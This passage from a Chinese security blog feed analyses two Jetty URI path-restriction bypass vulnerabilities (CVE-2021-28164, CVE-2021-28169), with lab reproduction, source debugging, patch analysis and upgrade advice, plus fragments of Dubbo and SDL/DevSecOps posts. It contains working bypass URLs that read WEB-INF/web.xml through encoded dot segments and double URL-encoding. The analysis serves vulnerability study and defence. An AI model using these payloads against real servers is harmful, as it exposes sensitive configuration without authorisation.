alt=""></p><p>而且，自带的Fastjson版本为1.2.70，AutoType会自动拦截掉TemplatesImpl类。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://www.checkmarx.com/blog/technical-blog/the-0xdabb-of-doom-cve-2021-25641/" target="_blank" rel="noopener">The 0xDABB of Doom: CVE-2021-25641</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Dubbo" scheme="https://www.mi1k7ea.com/tags/Dubbo/"/>
    
  </entry>
  
  <entry>
    <title>浅析Jetty两个URI路径限制绕过漏洞（CVE-2021-28164/CVE-2021-28169）</title>
    <link href="https://www.mi1k7ea.com/2021/06/14/%E6%B5%85%E6%9E%90Jetty%E4%B8%A4%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-28164-CVE-2021-28169%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/</id>
    <published>2021-06-14T13:14:38.000Z</published>
    <updated>2021-06-20T04:22:17.221Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间Jetty爆出了两个CVE，Vulhub也更新了该漏洞靶场，就简单地看下吧。</p><h2 id="0x01-Jetty-URI路径限制绕过漏洞（CVE-2021-28164）"><a href="#0x01-Jetty-URI路径限制绕过漏洞（CVE-2021-28164）" class="headerlink" title="0x01 Jetty URI路径限制绕过漏洞（CVE-2021-28164）"></a>0x01 Jetty URI路径限制绕过漏洞（CVE-2021-28164）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote><p>Jetty 9.4.37引入对RFC3986的新实现，而URL编码的<code>.</code>字符被排除在URI规范之外，这个行为在RFC中是正确的，但在servlet的实现中导致攻击者可以通过<code>%2e</code>来绕过限制，下载WEB-INF目录下的任意文件，导致敏感信息泄露。该漏洞在9.4.39中修复。</p></blockquote><p>实际测试中发现，是能同时绕过限制来下载WEB-INF和META-INF两个目录下的任意文件的（前提是存在该目录）。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>9.4.37.v20210219</li><li>9.4.38.v20210224</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考Vulhub：<a href="https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>正常访问页面如下：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/1.png" alt=""></p><p>尝试访问<code>/WEB-INF/web.xml</code>，返回404：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/2.png" alt=""></p><p>在Web路径前面添加URL编码的<code>./</code>即可权限绕过查看到web.xml的敏感信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%2e/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/3.png" alt=""></p><p><code>../</code>也是可以的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/noexist/%2e%2e/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/17.png" alt=""></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>在运行Jetty的命令中添加IDEA中远程调试的参数然后IDEA连接即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=y,<span class="built_in">suspend</span>=n,address=5005 -jar start.jar</span><br></pre></td></tr></table></figure><p>下面看下一些关键点即可。</p><h4 id="场景一：访问-WEB-INF-web-xml"><a href="#场景一：访问-WEB-INF-web-xml" class="headerlink" title="场景一：访问/WEB-INF/web.xml"></a>场景一：访问<code>/WEB-INF/web.xml</code></h4><p>在该漏洞版本中，可以看到Jetty Server在初始化HttpConnection类时，会将HTTP解析器遵从的是RFC7230_LEGACY：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/4.png" alt=""></p><p>往下调试，HttpURI类的parse()函数在处理URL路径时，在识别到<code>;?#/</code>等字符时会有一个检测URI的函数checkSegment()来对URI中是否存在<code>..;</code>、<code>%2e</code>、<code>%2e%2e</code>等特殊字符进行检测：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/10.png" alt=""></p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/5.png" alt=""></p><p>接着在Request类的setMetaData()函数是设置请求相关的方法类型、URI和请求路径信息等，其中会判断该URI是否存在上述的特殊字符，这里没有就跳过其中的代码逻辑：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/6.png" alt=""></p><p>设置完请求各项内容之后，往下就会调用到HTTPChannel中的action——Dispatch分发请求：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/7.png" alt=""></p><p>往下会看到会调用isProtectedTarget()函数检测URL路径是否为保护路径，是的话则直接将响应设置为404：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/8.png" alt=""></p><p>跟进isProtectedTarget()函数，这里保护目标含有<code>/web-inf</code>且忽略大小写和URL路径进行比较，我们访问的路径刚好匹配因此返回true：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/9.png" alt=""></p><p>再往后，就是返回404响应然后结束整个请求响应处理的过程了。</p><h4 id="场景二：访问-2e-WEB-INF-web-xml"><a href="#场景二：访问-2e-WEB-INF-web-xml" class="headerlink" title="场景二：访问/%2e/WEB-INF/web.xml"></a>场景二：访问<code>/%2e/WEB-INF/web.xml</code></h4><p>直接调试到checkSegment()函数中，识别到<code>%2e</code>并标记了出来：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/11.png" alt=""></p><p>往下，在Request类的setMetaData()函数中进入了hasAmbiguousSegment()判断为真的逻辑中，其中compliance就是RFC7230_LEGACY、其中的sections并不包含NO_AMBIGUOUS_PATH_SEGMENTS这一项，因此直接放行往下执行进行path的URL解码然后设置到PathInfo中：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/12.png" alt=""></p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/13.png" alt=""></p><p>由于path以<code>/./</code>开头，绕过了isProtectedTarget()函数的检测，从而导致继续往下正常处理请求返回内容：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/14.png" alt=""></p><p>往下就是chain.doFilter()调用拦截器，然后就是doGet()发送请求获取响应内容回来：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/15.png" alt=""></p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/16.png" alt=""></p><p>OK，至此我们已经发现漏洞产生的根源所在就是Jetty遵循的RFC7230_LEGACY没有包含NO_AMBIGUOUS_PATH_SEGMENTS即RFC3986、从而并没有对识别到的<code>%2e</code>进行处理。</p><p>我们看到NO_AMBIGUOUS_PATH_SEGMENTS中链接的RFC3986的URL，其中就说到了会把URI路径中的<code>.</code>和<code>..</code>删除掉的操作：<a href="https://datatracker.ietf.org/doc/html/rfc3986#section-3.3" target="_blank" rel="noopener">https://datatracker.ietf.org/doc/html/rfc3986#section-3.3</a></p><blockquote><p>The path segments “.” and “..”, also known as dot-segments, aredefined for relative reference within the path name hierarchy.  Theyare intended for use at the beginning of a relative-path reference(Section 4.2) to indicate relative position within the hierarchicaltree of names.  This is similar to their role within some operatingsystems’ file directory structures to indicate the current directoryand parent directory, respectively.  However, unlike in a filesystem, these dot-segments are only interpreted within the URI pathhierarchy and are removed as part of the resolution process (Section5.2).</p></blockquote><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>这里简单看下9.4.40版本的代码修复情况。</p><p>在RFC7230_LEGACY的sections中，添加了NO_AMBIGUOUS_PATH_PARAMETERS：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/21.png" alt=""></p><p>接着在判断存在歧义字符的为true之后的那段代码逻辑中，由于URI没有歧义参数因此没法直接进入第三个判断条件逻辑直接报错，而是继续往下执行：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/22.png" alt=""></p><p>接着就判断URI存在歧义字符的话就直接调用URIUtil.canonicalPath()函数进行URI规范化处理，其是专门处理<code>.</code>和<code>..</code>字符的，从而杜绝了该漏洞：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/23.png" alt=""></p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/24.png" alt=""></p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li><p>升级到9.4.39及以上版本；</p></li><li><p>或者更新<code>start.d/http.ini</code>包含以下内容来启用HttpCompliance模式RFC7230_NO_AMBIGUOUS_URIS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jetty.http.compliance=RFC7230_NO_AMBIGUOUS_URIS</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x02-Jetty-Servlets-URI路径限制绕过漏洞（CVE-2021-28169）"><a href="#0x02-Jetty-Servlets-URI路径限制绕过漏洞（CVE-2021-28169）" class="headerlink" title="0x02 Jetty Servlets URI路径限制绕过漏洞（CVE-2021-28169）"></a>0x02 Jetty Servlets URI路径限制绕过漏洞（CVE-2021-28169）</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Jetty Servlets中的ConcatServlet、WelcomeFilter类存在多重解码问题，当应用到这两个类之一时，攻击者就可以利用双重URL编码绕过限制来访问WEB-INF目录下的敏感文件，造成敏感信息泄露。</p><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>9.x系列 &lt;= 9.4.40</li><li>10.x系列 &lt;= 10.0.2</li><li>11.x系列 &lt;= 11.0.2</li></ul><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考Vulhub：<a href="https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28169" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28169</a></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>正常访问是个Example页面：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/18.png" alt=""></p><p>查看页面源码，其中link标签的href属性值是使用到了ConcatServlet类来优化静态文件的加载：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/static?/css/base.css&amp;/css/app.css"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>基于这种访问方式尝试直接访问WEB-INF下的文件是会返回404的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/static?/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/19.png" alt=""></p><p>对W进行双重URL编码则成功绕过限制访问得到敏感文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/static?/%2557EB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/20.png" alt=""></p><p>这里看到确实设置了ConcatServlet类来优化静态文件加载。</p><p>针对WelcomeFilter类的测试可以参考官网GitHub的代码：<a href="https://github.com/eclipse/jetty.project/pull/6261/commits/c704b8100a1ccc36f4bb8b80a96f3375dde8d182#diff-70d52a090f69fbcbb6fb9d0899c514474c25c4ea79263f81cbf0e87e3c103bd5" target="_blank" rel="noopener">https://github.com/eclipse/jetty.project/pull/6261/commits/c704b8100a1ccc36f4bb8b80a96f3375dde8d182#diff-70d52a090f69fbcbb6fb9d0899c514474c25c4ea79263f81cbf0e87e3c103bd5</a></p><h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><p>在运行Jetty的命令中添加IDEA中远程调试的参数然后IDEA连接即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=y,<span class="built_in">suspend</span>=n,address=5005 -jar start.jar</span><br></pre></td></tr></table></figure><p>之前在关于CVE-2021-28164的文章中已经简单调试过Jetty的主要路由处理过程了，后面就只看本次漏洞的关键点。</p><p>直接在ConcatServlet类的doGet()函数中下断点。</p><p><strong>访问<code>/static?/WEB-INF/web.xml</code></strong></p><p>在断点中看到，先获取请求查询内容即URI中?号之后<code>/WEB-INF/web.xml</code>，接着根据<code>&amp;</code>即做参数切分，再逐个参数进行操作（URL解码和<code>.</code>、<code>..</code>等字符处理），最后判断处理后的path值是否以<code>/WEB-INF/</code>或<code>/META-INF/</code>开头，是的话直接返回404：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/25.png" alt=""></p><p>可以看到，还想用<code>/./</code>和<code>/../</code>等方式已经行不通了，但是URL解码那块代码逻辑还需要继续跟进分析。</p><p><strong>访问<code>/static?/%2557EB-INF/web.xml</code></strong></p><p>调试到调用URIUtil.decodePath()函数进行解码的地方：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/26.png" alt=""></p><p>调试发现只进行了一次URL解码操作：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/27.png" alt=""></p><p>看下关键的处理逻辑，就是逐个获取请求参数的字符，当遇到<code>%</code>时会对其后面两位字符进行URL解码并替换结果，但是可以看到仅仅替换了一次，这就是漏洞根源：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Utf8StringBuilder builder = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">int</span> end = offset + length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = offset; i &lt; end; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> c = path.charAt(i);</span><br><span class="line">    <span class="keyword">switch</span> (c)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">            <span class="keyword">if</span> (builder == <span class="keyword">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                builder = <span class="keyword">new</span> Utf8StringBuilder(path.length());</span><br><span class="line">                builder.append(path, offset, i - offset);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((i + <span class="number">2</span>) &lt; end)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">char</span> u = path.charAt(i + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (u == <span class="string">'u'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// TODO remove %u support in jetty-10</span></span><br><span class="line">                    <span class="comment">// this is wrong. This is a codepoint not a char</span></span><br><span class="line">                    builder.append((<span class="keyword">char</span>)(<span class="number">0xffff</span> &amp; TypeUtil.parseInt(path, i + <span class="number">2</span>, <span class="number">4</span>, <span class="number">16</span>)));</span><br><span class="line">                    i += <span class="number">5</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    builder.append((<span class="keyword">byte</span>)(<span class="number">0xff</span> &amp; (TypeUtil.convertHexDigit(u) * <span class="number">16</span> + TypeUtil.convertHexDigit(path.charAt(i + <span class="number">2</span>)))));</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Bad URI % encoding"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">';'</span>:</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (builder != <span class="keyword">null</span>)</span><br><span class="line">                builder.append(c);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="补丁分析-1"><a href="#补丁分析-1" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>参考官方在9.4.41版本的修复commit：<a href="https://github.com/eclipse/jetty.project/pull/6261/commits/c704b8100a1ccc36f4bb8b80a96f3375dde8d182" target="_blank" rel="noopener">https://github.com/eclipse/jetty.project/pull/6261/commits/c704b8100a1ccc36f4bb8b80a96f3375dde8d182</a></p><p>ConcatServlet类的修复方法就是将path替换为part，即使用原始路径字符串作为分发器就会再次进行URL解码：</p><p><img src="/2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/28.png" alt=""></p><h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><p>升级到9.4.41, 10.0.3, 11.0.3及以上版本。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5" target="_blank" rel="noopener">https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5</a></p><p><a href="https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq" target="_blank" rel="noopener">https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Jetty" scheme="https://www.mi1k7ea.com/tags/Jetty/"/>
    
  </entry>
  
  <entry>
    <title>浅谈SDL与DevSecOps</title>
    <link href="https://www.mi1k7ea.com/2021/05/16/%E6%B5%85%E8%B0%88SDL%E4%B8%8EDevSecOps/"/>
    <id>https://www.mi1k7ea.com/2021/05/16/浅谈SDL与DevSecOps/</id>
    <published>2021-05-16T07:02:36.000Z</published>
    <updated>2021-05-29T08:19:11.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这里仅谈谈个人对安全研发（SDL）和安全DevOps（DevSecOps）的理解及相关思考，但由于缺乏DevSecOps实践经验因此这块无法详细畅谈。</p><h2 id="0x01-从企业的安全建设说起"><a href="#0x01-从企业的安全建设说起" class="headerlink" title="0x01 从企业的安全建设说起"></a>0x01 从企业的安全建设说起</h2><p>任何企业都是以业务为重。当企业的业务发展受制于安全的时候，此时企业就会考虑往安全方面投入了。比如，某公司被脱裤导致用户信息泄露之后，才开始成立自己的安全部来推动安全保障业务。</p><p>在早期的一些投入安全整改的企业中，很多企业一般都是每年花钱来请乙方安全厂商来做渗透测试、安全评估扫描等等，然后看看安全报告、推动修补相应的漏洞就了事了。但是到后来发现，这样每年给钱乙方搞安全还不如自己招那么几个安全工程师成立自己的安全部来得划算。因此，“一个人的安全部”就在这样的一些背景下产生了。这样的安全部往往人不多，但是负责安全方面的工作却比较多，从渗透测试、漏洞认领复现、安全开发、与开发扯皮、应急响应、安全运维…等等，其中个人认为于企业而言性价比最高的当然就是安全开发，企业如果购买安全厂商产品的话成本是很高的，但是如果自己招几个安全工程师搞下安全开发、搞一些如WAF、漏洞扫描器、IDS和IPS等产品，这就省了很多成本，到后期安全产品成熟了、也就变成了养那么几个安全工程师或者无须有的事情了。</p><p>当然，对于大厂而言，往往都会组建人数不少的安全部甚至每个产品线都组建自己的安全部来负责自己的产品安全，侧重点在于挖洞和修洞这两块。但是到后面，随着业务的发展，版本迭代越来越迅速，软件开发模型也变换甚多。此时，企业如果还只是纯粹地做渗透测试和安全风险评估，必然无法保障如此多版本的安全性，同时由于挖出的漏洞已处于产品“定型”阶段、导致漏洞的修复成本会非常高，这时国内企业又寻求新的变更点、学习微软的SDL，即<strong>将安全前置、使产品开发的每个阶段都融入安全活动、提高产品安全性并大大降低安全问题导致的修复成本</strong>。</p><h2 id="0x02-SDL"><a href="#0x02-SDL" class="headerlink" title="0x02 SDL"></a>0x02 SDL</h2><h3 id="SDL简介"><a href="#SDL简介" class="headerlink" title="SDL简介"></a>SDL简介</h3><p>SDL全称Security Development Lifecycle，即安全开发生命周期，是由微软提出并应用的一个帮助开发人员构建更安全的软件和解决安全合规要求的同时降低开发成本的软件开发过程。</p><p>SDL的核心理念就是将安全考虑集成在软件开发的每一个阶段：需求分析、设计、编码、测试和维护。从需求、设计到发布产品的每一个阶段每都增加了相应的安全活动，以减少软件中漏洞的数量并将安全缺陷降低到最小程度。</p><h3 id="SDL、SDLC和S-SDLC"><a href="#SDL、SDLC和S-SDLC" class="headerlink" title="SDL、SDLC和S-SDLC"></a>SDL、SDLC和S-SDLC</h3><p>SDL：Security Development Lifecycle，安全开发生命周期；</p><p>SDLC：Software Development Life Cycle，软件开发生命周期；</p><p>S-SDLC：Secure Software Development Life Cycle，安全软件开发生命周期，是由开源Web安全组织OWASP推出的一个项目，它跟SDL的区别是它更关注的是SDL的落地化；</p><h3 id="SDL相关人员角色"><a href="#SDL相关人员角色" class="headerlink" title="SDL相关人员角色"></a>SDL相关人员角色</h3><p>微软SDL中给出如下角色定义：</p><ul><li><strong>评析者/顾问角色</strong>：这些角色的任务是对项目安全和隐私进行监督，有权接受或拒绝项目团队的安全和隐私计划。<ul><li>安全顾问/隐私顾问。这些角色由项目团队外部的主题专家 (SME) 担任。该角色可以由组织中专门进行此类评析的独立集中小组中的合格成员担任，也可以由组织外部的专家担任。为此任务选择的人员必须担任两个子角色：<ul><li>审计官。此角色必须监控软件开发过程的每个阶段，并证明每个安全要求的成功实现。审计官必须能够自主证明过程是否符合安全和隐私要求方面的要求，而不受项目团队的干扰。</li><li>专家。为顾问角色选择的人员必须在安全方面拥有可靠的相关专业知识。</li></ul></li><li>顾问角色组合。如果可以确认某人具有合适的技能和经验，则安全顾问的角色可以与隐私顾问的角色合二为一。</li></ul></li><li><strong>团队负责人</strong>。团队负责人角色应由项目团队的主题专家担任。这些角色负责协商、接受和跟踪最低安全和隐私要求，并在软件开发项目过程中与顾问和决策者保持通畅的沟通渠道。<ul><li>安全负责人/隐私负责人。此角色（一人或多人）不仅负责确保软件发布解决了所有安全问题，还负责协调和跟踪项目的安全问题。此角色还负责向安全顾问和项目团队的其他相关方（例如，开发和测试负责人）报告情况。</li><li>角色组合。与安全和隐私顾问角色一样，如果可以确认某人具有合适的技能和经验，则可以由一人承担负责人角色的职责。</li></ul></li></ul><h3 id="SDL安全活动"><a href="#SDL安全活动" class="headerlink" title="SDL安全活动"></a>SDL安全活动</h3><p>从Microsoft SDL看起，这是一组必需的安全活动，这些活动的执行顺序与其显示顺序相同，按传统软件开发生命周期 (SDLC) 的阶段分组：</p><p><img src="/2021/05/16/浅谈SDL与DevSecOps/3.png" alt=""></p><p>如上图列出的是SDL中必须进行的安全活动。下面来看下各个阶段的安全活动。</p><h4 id="必须的安全活动"><a href="#必须的安全活动" class="headerlink" title="必须的安全活动"></a>必须的安全活动</h4><h5 id="SDL执行前：安全培训"><a href="#SDL执行前：安全培训" class="headerlink" title="SDL执行前：安全培训"></a>SDL执行前：安全培训</h5><p>在SDL执行之前，需要给研发团队进行相关的安全培训，包括但不限于以下内容。当然，个人认为对产品线研发团队的安全培训并不只是限于SDL执行之前、而是针对各个阶段都要进行。</p><ul><li>安全设计，包括以下主题：<ul><li>减小攻击面</li><li>深度防御</li><li>最小权限原则</li><li>安全默认设置</li></ul></li><li>威胁建模，包括以下主题：<ul><li>威胁建模概述</li><li>威胁模型的设计意义</li><li>基于威胁模型的编码约束</li></ul></li><li>安全编码，包括以下主题：<ul><li>缓冲区溢出（对于使用 C 和 C++ 的应用程序）</li><li>整数算法错误（对于使用 C 和 C++ 的应用程序）</li><li>跨站点脚本（对于托管代码和 Web 应用程序）</li><li>SQL 注入（对于托管代码和 Web 应用程序）</li></ul></li><li>弱加密安全测试，包括以下主题：<ul><li>安全测试与功能测试之间的区别</li><li>风险评估</li><li>安全测试方法</li></ul></li><li>隐私，包括以下主题：<ul><li>隐私敏感数据的类型</li><li>隐私设计最佳实践</li><li>风险评估</li><li>隐私开发最佳实践</li><li>隐私测试最佳实践</li></ul></li></ul><h5 id="第一阶段：要求"><a href="#第一阶段：要求" class="headerlink" title="第一阶段：要求"></a>第一阶段：要求</h5><p>本阶段主要包括3个SDL实践：</p><ul><li>安全要求：“预先”考虑安全和隐私是开发安全系统过程的基础环节。为软件项目定义信任度要求的最佳时间是在初始计划阶段。尽早定义要求有助于开发团队确定关键里程碑和交付成果，并使集成安全和隐私的过程尽量不影响到计划和安排。对安全和隐私要求的分析在项目初期执行，所做工作涉及为设计在计划运行环境中运行的应用程序确定最低安全要求，并确立和部署安全漏洞/工作项跟踪系统。</li><li>质量门/Bug栏：用于确立安全和隐私质量的最低可接受级别。</li><li>安全和隐私风险评估：安全风险评估 (SRA) 和隐私风险评估 (PRA) 是必需的过程，用于确定软件中需要深入评析的功能环节。这些评估必须包括以下信息：<ul><li>（安全）项目的哪些部分在发布前需要威胁模型？</li><li>（安全）项目的哪些部分在发布前需要进行安全设计评析？</li><li>（安全）项目的哪些部分（如果有）需要由不属于项目团队且双方认可的小组进行渗透测试？</li><li>（安全）是否存在安全顾问认为有必要增加的测试或分析要求以缓解安全风险？</li><li>（安全）模糊测试要求的具体范围是什么？</li><li>（隐私）隐私影响评级如何？</li></ul></li></ul><h5 id="第二阶段：设计"><a href="#第二阶段：设计" class="headerlink" title="第二阶段：设计"></a>第二阶段：设计</h5><p>SDL安全设计的6个核心原则：</p><ul><li>Attack Surface Reduction（攻击面最小化）</li><li>Basic Privacy（基本隐私）</li><li>Least Privilege（权限最小化）</li><li>Secure Defaults（默认安全）</li><li>Defense in Depth（纵深防御）</li><li>Threat Modeling（威胁建模）</li></ul><h5 id="第三阶段：实施"><a href="#第三阶段：实施" class="headerlink" 